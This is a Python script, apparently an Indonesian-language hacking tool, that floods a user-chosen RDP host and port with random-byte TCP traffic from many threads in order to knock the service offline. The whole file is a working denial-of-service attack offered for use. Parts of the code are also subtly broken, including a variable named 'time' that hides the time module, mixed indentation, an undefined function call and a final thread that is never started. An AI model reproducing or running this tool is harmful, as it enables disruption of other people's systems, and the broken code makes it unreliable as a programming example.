import os, sys, time, threading, socket, random

def clear():
	os.system('cls' if os.name=='nt' else 'clear')

def running(s):
	try:
		for c in s + '\n':
        	    sys.stdout.write(c)
	            sys.stdout.flush()
	            time.sleep(0.001)
	except (KeyboardInterrupt,EOFError):
		run('Error!!')

running("\033[94m-----> Simple Auto Suspend RDP")
running("\033[94m-----------> Code By Bl4ckSh4d0w")
ip = str(input("\033[94m╔═══\033[91m[ Masukkan IP-nya ] •\n\033[94m╠══>\033[0m "))
port = int(input("\033[94m╠═══\033[91m[ Masukkan PORT-nya ] •\n\033[94m╠══>\033[0m "))
time = int(input("\033[94m╠═══\033[91m[ Masukkan PACKETs-nya ] •\n\033[94m╠══>\033[0m "))
size = int(input("\033[94m╠═══\033[91m[ Masukkan THREADs-nya ] •\n\033[94m╠══>\033[0m "))
clear()

def run1():
	data = random._urandom(1025)
	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
		except:
			s.close()
			time.sleep(1)
			print("[ * ] Yahhh RDP {} {} Modar Sia :v".format(ip, port))

def run2():
	data = random._urandom(818)
	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
		except:
			s.close()
			time.sleep(1)
			print("[ * ] Yahhh RDP {} {} Modar Sia :v".format(ip, port))

def run3():
	data = random._urandom(1800)
	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
		except:
			s.close()
			time.sleep(1)
			print("[ * ] Yahhh RDP {} {} Modar Sia :v".format(ip, port))

def run4():
	data = random._urandom(1000)
	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
		except:
			s.close()
			time.sleep(1)
			print("[ * ] Yahhh RDP {} {} Modar Sia :v".format(ip, port))

def run5():
	data = random._urandom(999)
	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
		except:
			s.close()
			time.sleep(1)
			print("[ * ] Yahhh RDP {} {} Modar Sia :v".format(ip, port))

def run6():
	data = random._urandom(16)
	i = random.choice(("[ ! ] ","[ * ]","[ $ ]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(time):
				s.send(data)
				print(i +"Attacking rdp ip {} and port {}".format(ip, port))
		except:
			s.close()
			time.sleep(1)
			print("[ * ] Yahhh RDP {} {} Modar Sia :v".format(ip, port))

for x in range(size):
	th = threading.Thread(target = run1)
	th.start()
	th = threading.Thread(target = run2)
	th.start()
	th = threading.Thread(target = run3)
	th.start()

for i in range(size):
	th = threading.Thread(target = run4)
	th.start()
	th = threading.Thread(target = run5)
	th.start()
	th = threading.Thread(target = run6)